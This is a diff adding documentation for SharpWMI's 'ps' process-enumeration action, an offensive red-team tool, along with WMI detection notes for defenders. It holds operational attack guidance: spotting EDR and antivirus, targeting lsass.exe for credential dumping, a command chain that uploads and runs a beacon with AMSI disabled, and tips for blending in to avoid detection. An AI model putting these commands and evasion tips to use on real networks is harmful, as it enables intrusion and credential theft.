@@ -1,0 +1,278 @@
+---
+title: 'ps'
+description: 'List running processes with owner information'
+icon: 'list'
+---
+
+## Overview
+
+The `ps` action enumerates running processes on local and remote systems, including process ID, name, owner, and command line. It queries the `Win32_Process` WMI class and invokes the `GetOwner` method to retrieve process ownership information.
+
+## Syntax
+
+```bash
+SharpWMI.exe action=ps [computername=HOST[,HOST2,...]] [username=DOMAIN\user] [password=Password]
+```
+
+## Parameters
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `action` | Yes | Must be `ps` |
+| `computername` | No | Target host(s), comma-separated. Defaults to localhost |
+| `username` | No | Username for authentication |
+| `password` | No | Password for authentication |
+
+## Usage Examples
+
+<CodeGroup>
+```bash Local System
+SharpWMI.exe action=ps
+```
+
+```bash Remote System
+SharpWMI.exe action=ps computername=target.domain.com
+```
+
+```bash With Credentials
+SharpWMI.exe action=ps computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+```
+
+```bash Multiple Hosts
+SharpWMI.exe action=ps computername=server1,server2,server3
+```
+</CodeGroup>
+
+### Example Output
+
+```
+   PID |                           Name |                     Owner | CommandLine
+------+--------------------------------+---------------------------+------------------------------------------
+  1234 |                   chrome.exe   |         DOMAIN\jdoe       | "C:\Program Files\Google\Chrome\Application\chrome.exe"
+  5678 |                 powershell.exe |    DOMAIN\Administrator   | powershell.exe -NoProfile -ExecutionPolicy Bypass
+  9012 |                      cmd.exe   |         DOMAIN\jdoe       | cmd.exe
+  3456 |                  explorer.exe  |         DOMAIN\jdoe       | C:\Windows\Explorer.EXE
+   748 |                   svchost.exe  |    NT AUTHORITY\SYSTEM    | C:\Windows\system32\svchost.exe -k NetworkService
+```
+
+## Output Fields
+
+| Field | Description |
+|-------|-------------|
+| PID | Process ID |
+| Name | Process executable name |
+| Owner | Domain\Username running the process |
+| CommandLine | Full command line with arguments |
+
+## Operational Use Cases
+
+### Scenario 1: Hunt for Admin Processes
+
+```bash
+# Look for admin-owned processes
+SharpWMI.exe action=ps computername=workstation.domain.com
+```
+
+Identify:
+- Processes owned by domain admins
+- Privileged service accounts
+- SYSTEM-owned processes
+- Interactive admin sessions
+
+### Scenario 2: Detect Security Tools
+
+```bash
+# Enumerate processes on target
+SharpWMI.exe action=ps computername=target.domain.com
+```
+
+Look for:
+- AV processes (MsMpEng.exe, AvastSvc.exe)
+- EDR agents (CrowdStrike, Carbon Black)
+- Monitoring tools (Sysmon)
+- PowerShell activity
+
+### Scenario 3: Identify Credential Sources
+
+```bash
+# Check for credential-rich processes
+SharpWMI.exe action=ps computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+```
+
+Target processes:
+- lsass.exe (credential dumping)
+- Browser processes (saved passwords)
+- Password managers (KeePass, 1Password)
+- Database connections
+
+### Scenario 4: Post-Exploitation Verification
+
+```bash
+# Verify payload execution
+SharpWMI.exe action=upload computername=target source="beacon.exe" dest="C:\temp\svc.exe" amsi=disable
+SharpWMI.exe action=exec computername=target command="C:\temp\svc.exe"
+SharpWMI.exe action=ps computername=target
+```
+
+Confirm:
+- Beacon is running
+- Process ID and owner
+- Command line arguments
+- Parent process
+
+## Remote vs Local Usage
+
+<Tabs>
+  <Tab title="Local Enumeration">
+    ```bash
+    SharpWMI.exe action=ps
+    ```
+
+    **When to use:**
+    - Post-exploitation enumeration
+    - Local process discovery
+    - No remote access available
+
+    **Advantages:**
+    - No network traffic
+    - No authentication required
+    - Faster execution
+  </Tab>
+
+  <Tab title="Remote Enumeration">
+    ```bash
+    SharpWMI.exe action=ps computername=target.domain.com
+    ```
+
+    **When to use:**
+    - Reconnaissance phase
+    - Credential hunting
+    - Target validation
+    - Multi-system enumeration
+
+    **Requirements:**
+    - Admin privileges on target
+    - WMI access over network
+  </Tab>
+</Tabs>
+
+## Detection Considerations
+
+<AccordionGroup>
+  <Accordion title="WMI Detection" icon="radar">
+    - WMI queries for `Win32_Process` class
+    - GetOwner method invocations
+    - Event ID 5857: WMI activity
+    - Sysmon Event ID 19-21: WMI operations
+  </Accordion>
+
+  <Accordion title="Reconnaissance Patterns" icon="magnifying-glass">
+    - Process enumeration across multiple systems
+    - Queries from non-administrative hosts
+    - Bulk queries in short timeframe
+    - Correlation with other enumeration
+  </Accordion>
+
+  <Accordion title="Network Detection" icon="network-wired">
+    - WMI/DCOM traffic on port 135
+    - Multiple connections from single source
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Operational Security" icon="user-secret">
+    - Limit query frequency
+    - Blend with legitimate admin activity
+    - Use during business hours
+    - Avoid bulk enumeration
+  </Card>
+
+  <Card title="Data Analysis" icon="chart-line">
+    - Filter system processes
+    - Focus on user-owned processes
+    - Look for unusual command lines
+    - Identify high-value targets
+  </Card>
+</CardGroup>
+
+## Filtering Process Output
+
+Since SharpWMI returns all processes, you may want to filter results. Here are common targets:
+
+### Interesting Processes
+
+- **PowerShell:** `powershell.exe`, `pwsh.exe`
+- **Credential Access:** `lsass.exe`, `mstsc.exe`
+- **Security Tools:** `MsMpEng.exe`, `cb.exe`, `falcon-sensor.exe`
+- **Browsers:** `chrome.exe`, `firefox.exe`, `msedge.exe`
+- **Shells:** `cmd.exe`, `conhost.exe`
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Access Denied">
+    **Cause:** Insufficient privileges
+
+    **Solution:**
+    - Use `username` and `password` parameters
+    - Verify admin rights on target
+    - Check UAC remote restrictions
+  </Accordion>
+
+  <Accordion title="Empty Owner Field">
+    **Cause:** GetOwner method failed
+
+    **Solution:**
+    - Some system processes don't have owners
+    - This is normal for SYSTEM processes
+    - Check permissions if user processes show empty
+  </Accordion>
+
+  <Accordion title="RPC Server Unavailable">
+    **Cause:** Network or service issue
+
+    **Solution:**
+    - Verify target is online
+    - Check firewall rules
+    - Ensure WMI service is running
+  </Accordion>
+</AccordionGroup>
+
+## Related Actions
+
+<CardGroup cols={2}>
+  <Card title="terminate" icon="xmark" href="/ghostpack-docs/SharpWMI-mdx/actions/terminate">
+    Kill processes by name or PID
+  </Card>
+  <Card title="query" icon="database" href="/ghostpack-docs/SharpWMI-mdx/actions/query">
+    Custom process queries
+  </Card>
+  <Card title="exec" icon="terminal" href="/ghostpack-docs/SharpWMI-mdx/actions/exec">
+    Create new processes
+  </Card>
+  <Card title="loggedon" icon="users" href="/ghostpack-docs/SharpWMI-mdx/actions/loggedon">
+    Enumerate logged-on users
+  </Card>
+</CardGroup>
+
+## Alternative Query Methods
+
+<Accordion title="Processes by Name">
+  ```bash
+  SharpWMI.exe action=query computername=target query="SELECT ProcessId,Name,CommandLine FROM Win32_Process WHERE Name='powershell.exe' OR Name='cmd.exe'"
+  ```
+</Accordion>
+
+<Accordion title="Processes by Path">
+  ```bash
+  SharpWMI.exe action=query computername=target query="SELECT ProcessId,Name FROM Win32_Process WHERE ExecutablePath LIKE '%temp%'"
+  ```
+</Accordion>
+
+<Accordion title="High CPU Processes">
+  ```bash
+  SharpWMI.exe action=query computername=target query="SELECT ProcessId,Name FROM Win32_Process WHERE PercentProcessorTime > 50"
+  ```
+</Accordion>
